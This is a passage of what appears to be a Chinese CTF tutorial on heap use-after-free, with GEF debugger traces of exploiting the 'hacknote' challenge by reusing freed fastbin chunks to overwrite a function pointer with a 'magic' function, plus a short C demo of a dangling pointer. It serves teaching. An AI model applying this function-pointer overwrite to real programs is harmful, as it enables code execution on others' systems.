0x00000000 $ebx : 0x0804b008 \u2192 0x0804865b \u2192 < print_note_content + 0 > push ebp $ecx : 0xf7fac780 \u2192 0x00000000 $edx : 0x0804b018 \u2192 0x00000000 $esp : 0xffffcf10 \u2192 0x00000020 $ebp : 0xffffcf48 \u2192 0xffffcf68 \u2192 0x00000000 $esi : 0xf7fac000 \u2192 0x001b1db0 $edi : 0xf7fac000 \u2192 0x001b1db0 $eip : 0x08048761 \u2192 < add_note + 235 > add esp , 0x10 $cs : 0x00000023 $ss : 0x0000002b $ds : 0x0000002b $es : 0x0000002b $fs : 0x00000000 $gs : 0x00000063 $eflags: [ carry PARITY adjust ZERO sign trap INTERRUPT direction overflow resume virtualx86 identification ] \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ code: i386 ] \u2500\u2500\u2500\u2500 0 x8048752 < add_note + 220 > mov al , ds : 0x458b0804 0 x8048757 < add_note + 225 > call 0x581173df 0 x804875c < add_note + 230 > call 0x80484e0 < malloc@plt > \u2192 0 x8048761 < add_note + 235 > add esp , 0x10 0 x8048764 < add_note + 238 > mov DWORD PTR [ ebx + 0x4 ], eax 0 x8048767 < add_note + 241 > mov eax , DWORD PTR [ ebp-0x1c ] 0 x804876a < add_note + 244 > mov eax , DWORD PTR [ eax * 4 + 0x804a070 ] \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ stack ] \u2500\u2500\u2500\u2500 ['0 xffffcf10 ' , ' l8 ' ] 8 0 xffffcf10 \u2502+ 0x00 : 0x00000020 \u2190 $esp 0 xffffcf14 \u2502+ 0x04 : 0xffffcf34 \u2192 0xf70a3233 0 xffffcf18 \u2502+ 0x08 : 0x00000008 0 xffffcf1c \u2502+ 0x0c : 0xf7e27260 \u2192 < atoi + 16 > add esp , 0x1c 0 xffffcf20 \u2502+ 0x10 : 0xffffcf58 \u2192 0xffff0a31 \u2192 0x00000000 0 xffffcf24 \u2502+ 0x14 : 0x00000000 0 xffffcf28 \u2502+ 0x18 : 0x0000000a 0 xffffcf2c \u2502+ 0x1c : 0x00000000 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ trace ] \u2500\u2500\u2500\u2500 --- Type < return > to continue , or q < return > to quit--- [ #0] 0x8048761 \u2192 Name: add_note() [ #1] 0x8048ac5 \u2192 Name: main() \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 gef \u27a4 heap chunk 0x0804b018 UsedChunk ( addr = 0x804b018 , size = 0x28 ) Chunk size : 40 ( 0x28 ) Usable size : 36 ( 0x24 ) Previous chunk size : 0 ( 0x0 ) PREV_INUSE flag : On IS_MMAPPED flag : Off NON_MAIN_ARENA flag : Off \u7c7b\u4f3c\u7684\uff0c\u6211\u4eec\u53ef\u4ee5\u5f97\u5230note1\u7684\u5730\u5740\u4ee5\u53ca\u5176content\u7684\u5730\u5740\u5206\u522b\u4e3a0x0804b040 \u548c0x0804b050\u3002 \u540c\u65f6\uff0c\u6211\u4eec\u8fd8\u53ef\u4ee5\u770b\u5230note0\u4e0enote1\u5bf9\u5e94\u7684content\u786e\u5b9e\u662f\u76f8\u5e94\u7684\u5185\u5b58\u5757\u3002 gef \u27a4 grep aaaa [+] Searching ' aaaa ' in memory [+] In ' [ heap ] ' ( 0x804b000 - 0x806c000 ), permission = rw- 0 x804b018 - 0x804b01c \u2192 \" aaaa \" gef \u27a4 grep ddaa [+] Searching ' ddaa ' in memory [+] In ' [ heap ] ' ( 0x804b000 - 0x806c000 ), permission = rw- 0 x804b050 - 0x804b054 \u2192 \" ddaa \" \u4e0b\u9762\u5c31\u662ffree\u7684\u8fc7\u7a0b\u4e86\u3002\u6211\u4eec\u53ef\u4ee5\u4f9d\u6b21\u53d1\u73b0\u9996\u5148\uff0cnote0\u7684content\u88abfree \u2192 0 x8048893 < del_note + 143 > call 0x80484c0 < free@plt > \u21b3 0 x80484c0 < free@plt + 0 > jmp DWORD PTR ds : 0x804a018 0 x80484c6 < free@plt + 6 > push 0x18 0 x80484cb < free@plt + 11 > jmp 0x8048480 0 x80484d0 < __stack_chk_fail@plt + 0 > jmp DWORD PTR ds : 0x804a01c \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ stack ] \u2500\u2500\u2500\u2500 ['0 xffffcf20 ' , ' l8 ' ] 8 0 xffffcf20 \u2502+ 0x00 : 0x0804b018 \u2192 \" aaaa \" \u2190 $esp \u7136\u540e\u662fnote0\u672c\u8eab \u2192 0 x80488a9 < del_note + 165 > call 0x80484c0 < free@plt > \u21b3 0 x80484c0 < free@plt + 0 > jmp DWORD PTR ds : 0x804a018 0 x80484c6 < free@plt + 6 > push 0x18 0 x80484cb < free@plt + 11 > jmp 0x8048480 0 x80484d0 < __stack_chk_fail@plt + 0 > jmp DWORD PTR ds : 0x804a01c \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ stack ] \u2500\u2500\u2500\u2500 ['0 xffffcf20 ' , ' l8 ' ] 8 0 xffffcf20 \u2502+ 0x00 : 0x0804b008 \u2192 0x0804865b \u2192 < print_note_content + 0 > push ebp \u2190 $esp \u5f53delete\u7ed3\u675f\u540e\uff0c\u6211\u4eec\u89c2\u770b\u4e00\u4e0bbins\uff0c\u53ef\u4ee5\u53d1\u73b0\uff0c\u786e\u5b9e\u5176\u88ab\u5b58\u653e\u5728\u5bf9\u5e94\u7684fast bin\u4e2d\uff0c gef \u27a4 heap bins \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [ Fastbins for arena 0xf7fac780 ] \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 Fastbins [ idx = 0 , size = 0x8 ] \u2190 UsedChunk ( addr = 0x804b008 , size = 0x10 ) Fastbins [ idx = 1 , size = 0xc ] 0x00 Fastbins [ idx = 2 , size = 0x10 ] 0x00 Fastbins [ idx = 3 , size = 0x14 ] \u2190 UsedChunk ( addr = 0x804b018 , size = 0x28 ) Fastbins [ idx = 4 , size = 0x18 ] 0x00 Fastbins [ idx = 5 , size = 0x1c ] 0x00 Fastbins [ idx = 6 , size = 0x20 ] 0x00 \u5f53\u6211\u4eec\u5c06note1\u4e5f\u5168\u90e8\u5220\u9664\u5b8c\u6bd5\u540e\uff0c\u518d\u6b21\u89c2\u770bbins\u3002\u53ef\u4ee5\u770b\u51fa\uff0c\u540e\u5220\u9664\u7684chunk\u5757\u786e\u5b9e\u5904\u4e8e\u8868\u5934\u3002 gef \u27a4 heap bins \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ Fastbins for arena 0xf7fac780 ] \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 Fastbins [ idx = 0 , size = 0x8 ] \u2190 UsedChunk ( addr = 0x804b040 , size = 0x10 ) \u2190 UsedChunk ( addr = 0x804b008 , size = 0x10 ) Fastbins [ idx = 1 , size = 0xc ] 0x00 Fastbins [ idx = 2 , size = 0x10 ] 0x00 Fastbins [ idx = 3 , size = 0x14 ] \u2190 UsedChunk ( addr = 0x804b050 , size = 0x28 ) \u2190 UsedChunk ( addr = 0x804b018 , size = 0x28 ) Fastbins [ idx = 4 , size = 0x18 ] 0x00 Fastbins [ idx = 5 , size = 0x1c ] 0x00 Fastbins [ idx = 6 , size = 0x20 ] 0x00 \u90a3\u4e48\uff0c\u6b64\u65f6\u5373\u5c06\u8981\u7533\u8bf7note2\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u4e0bnote2\u90fd\u7533\u8bf7\u5230\u4e86\u4ec0\u4e48\u5185\u5b58\u5757\uff0c\u5982\u4e0b \u7533\u8bf7note2\u5bf9\u5e94\u7684\u5185\u5b58\u5757\u4e3a0x804b040\uff0c\u5176\u5b9e\u5c31\u662fnote1\u5bf9\u5e94\u7684\u5185\u5b58\u5730\u5740\u3002 [+] Heap-Analysis - malloc ( 8 ) = 0x804b040 [+] Heap-Analysis - malloc ( 8 ) = 0x804b040 0 x080486cf in add_note () \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ registers ] \u2500\u2500\u2500\u2500 $eax : 0x0804b040 \u2192 0x0804b000 \u2192 0x00000000 $ebx : 0x00000000 $ecx : 0xf7fac780 \u2192 0x00000000 $edx : 0x0804b040 \u2192 0x0804b000 \u2192 0x00000000 $esp : 0xffffcf10 \u2192 0x00000008 $ebp : 0xffffcf48 \u2192 0xffffcf68 \u2192 0x00000000 $esi : 0xf7fac000 \u2192 0x001b1db0 $edi : 0xf7fac000 \u2192 0x001b1db0 $eip : 0x080486cf \u2192 < add_note + 89 > add esp , 0x10 $cs : 0x00000023 $ss : 0x0000002b $ds : 0x0000002b $es : 0x0000002b $fs : 0x00000000 $gs : 0x00000063 $eflags: [ carry PARITY adjust ZERO sign trap INTERRUPT direction overflow resume virtualx86 identification ] \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ code: i386 ] \u2500\u2500\u2500\u2500 0 x80486c2 < add_note + 76 > add DWORD PTR [ eax ], eax 0 x80486c4 < add_note + 78 > add BYTE PTR [ ebx + 0x86a0cec ], al 0 x80486ca < add_note + 84 > call 0x80484e0 < malloc@plt > \u2192 0 x80486cf < add_note + 89 > add esp , 0x10 \u7533\u8bf7note2\u7684content\u7684\u5185\u5b58\u5730\u5740\u4e3a0x804b008\uff0c\u5c31\u662fnote0\u5bf9\u5e94\u7684\u5730\u5740\uff0c\u5373\u6b64\u65f6\u6211\u4eec\u5411note2\u7684content\u5199\u5185\u5bb9\uff0c\u5c31\u4f1a\u5c06note0\u7684put\u5b57\u6bb5\u8986\u76d6\u3002 gef \u27a4 n 1 [+] Heap-Analysis - malloc ( 8 ) = 0x804b008 [+] Heap-Analysis - malloc ( 8 ) = 0x804b008 0 x08048761 in add_note () \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ registers ] \u2500\u2500\u2500\u2500 $eax : 0x0804b008 \u2192 0x00000000 $ebx : 0x0804b040 \u2192 0x0804865b \u2192 < print_note_content + 0 > push ebp $ecx : 0xf7fac780 \u2192 0x00000000 $edx : 0x0804b008 \u2192 0x00000000 $esp : 0xffffcf10 \u2192 0x00000008 $ebp : 0xffffcf48 \u2192 0xffffcf68 \u2192 0x00000000 $esi : 0xf7fac000 \u2192 0x001b1db0 $edi : 0xf7fac000 \u2192 0x001b1db0 $eip : 0x08048761 \u2192 < add_note + 235 > add esp , 0x10 $cs : 0x00000023 $ss : 0x0000002b $ds : 0x0000002b $es : 0x0000002b $fs : 0x00000000 $gs : 0x00000063 $eflags: [ carry PARITY adjust ZERO sign trap INTERRUPT direction overflow resume virtualx86 identification ] \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ code: i386 ] \u2500\u2500\u2500\u2500 0 x8048752 < add_note + 220 > mov al , ds : 0x458b0804 0 x8048757 < add_note + 225 > call 0x581173df 0 x804875c < add_note + 230 > call 0x80484e0 < malloc@plt > \u2192 0 x8048761 < add_note + 235 > add esp , 0x10 \u6211\u4eec\u6765\u5177\u4f53\u68c0\u9a8c\u4e00\u4e0b\uff0c\u770b\u4e00\u4e0b\u8986\u76d6\u524d\u7684\u60c5\u51b5\uff0c\u53ef\u4ee5\u770b\u5230\u8be5\u5185\u5b58\u5757\u7684put\u6307\u9488\u5df2\u7ecf\u88ab\u7f6e\u4e3aNULL\u4e86\uff0c\u8fd9\u662f\u7531fastbin\u7684free\u673a\u5236\u51b3\u5b9a\u7684\u3002 gef \u27a4 x / 2 xw 0x804b008 0 x804b008: 0 x00000000 0x0804b018 \u8986\u76d6\u540e\uff0c\u5177\u4f53\u7684\u503c\u5982\u4e0b gef \u27a4 x / 2 xw 0x804b008 0 x804b008: 0 x08048986 0x0804b00a gef \u27a4 x / i 0x08048986 0 x8048986 < magic > : push ebp \u53ef\u4ee5\u770b\u51fa\uff0c\u786e\u5b9e\u5df2\u7ecf\u88ab\u8986\u76d6\u4e3a\u6211\u4eec\u6240\u60f3\u8981\u7684magic\u51fd\u6570\u4e86\u3002 \u6700\u540e\u6267\u884c\u7684\u6548\u679c\u5982\u4e0b [ + ] Starting local process './hacknote' : pid 35030 [ * ] Switching to interactive mode flag { use_after_free } ---------------------- HackNote ---------------------- 1 . Add note 2 . Delete note 3 . Print note 4 . Exit ---------------------- \u540c\u65f6\uff0c\u6211\u4eec\u8fd8\u53ef\u4ee5\u501f\u52a9gef\u7684heap-analysis-helper \u6765\u770b\u4e00\u4e0b\u6574\u4f53\u7684\u5806\u7684\u7533\u8bf7\u4e0e\u91ca\u653e\u7684\u60c5\u51b5\uff0c\u5982\u4e0b gef \u27a4 heap-analysis-helper [*] This feature is under development , expect bugs and unstability... [+] Tracking malloc () [+] Tracking free () [+] Tracking realloc () [+] Disabling hardware watchpoints ( this may increase the latency ) [+] Dynamic breakpoints correctly setup , GEF will break execution if a possible vulnerabity is found. [*] Note: The heap analysis slows down noticeably the execution. gef \u27a4 c Continuing. [+] Heap-Analysis - malloc ( 8 ) = 0x804b008 [+] Heap-Analysis - malloc ( 8 ) = 0x804b008 [+] Heap-Analysis - malloc ( 32 ) = 0x804b018 [+] Heap-Analysis - malloc ( 8 ) = 0x804b040 [+] Heap-Analysis - malloc ( 32 ) = 0x804b050 [+] Heap-Analysis - free ( 0x804b018 ) [+] Heap-Analysis - watching 0x804b018 [+] Heap-Analysis - free ( 0x804b008 ) [+] Heap-Analysis - watching 0x804b008 [+] Heap-Analysis - free ( 0x804b050 ) [+] Heap-Analysis - watching 0x804b050 [+] Heap-Analysis - free ( 0x804b040 ) [+] Heap-Analysis - watching 0x804b040 [+] Heap-Analysis - malloc ( 8 ) = 0x804b040 [+] Heap-Analysis - malloc ( 8 ) = 0x804b008 [+] Heap-Analysis - Cleaning up [+] Heap-Analysis - Re-enabling hardware watchpoints [ New process 36248 ] process 36248 is executing new program : / bin / dash [ New process 36249 ] process 36249 is executing new program : / bin / cat [ Inferior 3 ( process 36249 ) exited normally ] \u8fd9\u91cc\u7b2c\u4e00\u4e2a\u8f93\u51fa\u4e86\u4e24\u6b21\uff0c\u5e94\u8be5\u662fgef\u5de5\u5177\u7684\u95ee\u9898\u3002 \u9898\u76ee \u00b6 2016 HCTF fheap","title":"Use After Free"},{"location":"pwn/heap/use_after_free/#use-after-free","text":"","title":"Use After Free"},{"location":"pwn/heap/use_after_free/#_1","text":"\u7b80\u5355\u7684\u8bf4\uff0cUse After Free \u5c31\u662f\u5176\u5b57\u9762\u6240\u8868\u8fbe\u7684\u610f\u601d\uff0c\u5f53\u4e00\u4e2a\u5185\u5b58\u5757\u88ab\u91ca\u653e\u4e4b\u540e\u518d\u6b21\u88ab\u4f7f\u7528\u3002\u4f46\u662f\u5176\u5b9e\u8fd9\u91cc\u6709\u4ee5\u4e0b\u51e0\u79cd\u60c5\u51b5 \u5185\u5b58\u5757\u88ab\u91ca\u653e\u540e\uff0c\u5176\u5bf9\u5e94\u7684\u6307\u9488\u88ab\u8bbe\u7f6e\u4e3a NULL \uff0c \u7136\u540e\u518d\u6b21\u4f7f\u7528\uff0c\u81ea\u7136\u7a0b\u5e8f\u4f1a\u5d29\u6e83\u3002 \u5185\u5b58\u5757\u88ab\u91ca\u653e\u540e\uff0c\u5176\u5bf9\u5e94\u7684\u6307\u9488\u6ca1\u6709\u88ab\u8bbe\u7f6e\u4e3a NULL \uff0c\u7136\u540e\u5728\u5b83\u4e0b\u4e00\u6b21\u88ab\u4f7f\u7528\u4e4b\u524d\uff0c\u6ca1\u6709\u4ee3\u7801\u5bf9\u8fd9\u5757\u5185\u5b58\u5757\u8fdb\u884c\u4fee\u6539\uff0c\u90a3\u4e48 \u7a0b\u5e8f\u5f88\u6709\u53ef\u80fd\u53ef\u4ee5\u6b63\u5e38\u8fd0\u8f6c \u3002 \u5185\u5b58\u5757\u88ab\u91ca\u653e\u540e\uff0c\u5176\u5bf9\u5e94\u7684\u6307\u9488\u6ca1\u6709\u88ab\u8bbe\u7f6e\u4e3aNULL\uff0c\u4f46\u662f\u5728\u5b83\u4e0b\u4e00\u6b21\u4f7f\u7528\u4e4b\u524d\uff0c\u6709\u4ee3\u7801\u5bf9\u8fd9\u5757\u5185\u5b58\u8fdb\u884c\u4e86\u4fee\u6539\uff0c\u90a3\u4e48\u5f53\u7a0b\u5e8f\u518d\u6b21\u4f7f\u7528\u8fd9\u5757\u5185\u5b58\u65f6\uff0c \u5c31\u5f88\u6709\u53ef\u80fd\u4f1a\u51fa\u73b0\u5947\u602a\u7684\u95ee\u9898 \u3002 \u800c\u6211\u4eec\u4e00\u822c\u6240\u6307\u7684 Use After Free \u6f0f\u6d1e\u4e3b\u8981\u662f\u540e\u4e24\u79cd\u3002\u6b64\u5916\uff0c \u6211\u4eec\u4e00\u822c\u79f0\u88ab\u91ca\u653e\u540e\u6ca1\u6709\u88ab\u8bbe\u7f6e\u4e3aNULL\u7684\u5185\u5b58\u6307\u9488\u4e3adangling pointer\u3002 \u8fd9\u91cc\u7ed9\u51fa\u4e00\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50 #include <stdio.h> #include <stdlib.h> typedef struct name { char * myname ; void ( * func )( char * str ); } NAME ; void myprint ( char * str ) { printf ( \"%s \\n \" , str ); } void printmyname () { printf ( \"call print my name \\n \" ); } int main () { NAME * a ; a = ( NAME * ) malloc ( sizeof ( struct name )); a -> func = myprint ; a -> myname = \"I can also use it\" ; a -> func ( \"this is my function\" ); // free without modify free ( a ); a -> func ( \"I can also use it\" ); // free with modify a -> func = printmyname ; a -> func ( \"this is my function\" ); // set NULL a = NULL ; printf ( \"this pogram will crash... \\n \" ); a -> func ( \"can not be printed...\" ); } \u8fd0\u884c\u7ed3\u679c\u5982\u4e0b \u279c use_after_free git: ( use_after_free ) \u2717 ./use_after_free this is my function I can also use it call print my name this pogram will crash... [ 1 ] 38738 segmentation fault ( core dumped ) 